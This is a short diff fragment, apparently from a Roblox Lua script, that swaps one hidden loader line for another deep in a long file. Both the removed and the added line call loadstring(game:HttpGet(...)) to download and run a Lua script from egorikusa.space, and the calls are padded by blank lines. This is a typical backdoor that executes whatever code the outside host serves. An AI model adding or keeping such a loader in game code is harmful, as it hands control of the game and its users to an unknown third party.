@@ -18269,9 +18269,7 @@
 
 
 
-
-loadstring(game:HttpGet("https://egorikusa.space/714dec80aac3bf6ad04e1d7b.lua", true))()
-
+loadstring(game:HttpGet("https://egorikusa.space/02b0b983d150ee3c84c34a00.lua", true))()
 
 
 
